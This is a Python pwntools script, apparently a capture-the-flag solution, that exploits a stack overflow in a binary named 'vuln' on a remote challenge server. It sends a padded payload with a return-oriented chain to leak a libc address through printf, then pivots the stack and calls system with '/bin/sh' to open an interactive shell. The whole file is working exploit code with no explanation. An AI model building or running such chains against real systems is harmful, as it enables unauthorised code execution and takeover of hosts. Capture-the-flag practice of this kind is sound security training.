from pwn import *
context(arch='amd64',os='linux',log_level='debug')
p,e,libc=load("vuln","xyctf.top:57558","")
debug(p,0x4012A7,0x4012AD)
printf_got=0x403FD8
printf_plt=0x401084
bss=0x4040e0+0x800+0x8
ret=0x40101a
payload=b"zzzzzzzz"
p.sendlineafter("Your name:",payload)
payload=b"aaaaaaaa"+b"b"*8+b"c"*8+b"d"*8+p64(bss)
payload+=p64(ret)+p64(printf_plt)+p64(0x401279)
p.sendafter(' passwd:',payload)
p.recvuntil(b"\x0d")
libc_addr=u64(p.recv(6).ljust(8,b"\x00"))-0x62050
log_addr("libc_addr")
mov_rsp_rdx=0x000000000005a120+libc_addr
pop_rdx_rbx=0x00000000000904a9+libc_addr
system_addr=libc_addr+libc.symbols['system']
bin_sh=libc_addr+next(libc.search(b"/bin/sh"))
pop_rdi=libc_addr+0x000000000002a3e5
payload=b"\x00"*(0x27-8)+p64(bss)+p64(pop_rdi)+p64(bin_sh)+p64(system_addr)
log_addr("pop_rdi")
pause()

p.sendline(payload)
log_addr("pop_rdi")
p.interactive()
